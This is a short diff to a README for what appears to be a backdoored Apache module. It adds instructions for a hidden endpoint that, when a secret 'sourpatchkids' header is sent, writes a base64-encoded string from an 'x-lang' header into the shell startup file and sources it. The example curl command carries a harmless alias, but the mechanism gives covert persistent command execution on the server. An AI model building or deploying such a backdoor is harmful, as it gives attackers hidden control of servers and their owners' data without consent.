@@ -79,6 +79,13 @@ Gets information about the web server.
 ```
 sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=info
 ```
+### Bashrc
+
+You give it a base64 encoded sring which it adds to the `.basharc`. It will also use the `source` command on the file
+
+```
+sudo curl -H "sourpatchkids: sourpatchkids" -H "x-lang: YWxpYXMgbWMyPSJwd2QiCg==" http://localhost/errorteacups?url=bashrc
+```
 # Sources
 
 - https://httpd.apache.org/docs/current/developer/modguide.html
